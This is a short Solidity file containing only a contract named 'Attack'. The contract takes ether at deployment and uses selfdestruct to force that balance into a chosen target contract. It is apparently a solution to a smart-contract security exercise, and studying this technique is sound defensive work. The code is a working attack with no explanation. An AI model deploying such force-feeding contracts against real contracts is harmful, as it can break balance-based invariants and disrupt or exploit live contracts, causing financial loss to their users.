//SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract Attack {
    constructor() payable {}

    function attack(address payable contractAddress) external {
        selfdestruct(contractAddress);
    }
}
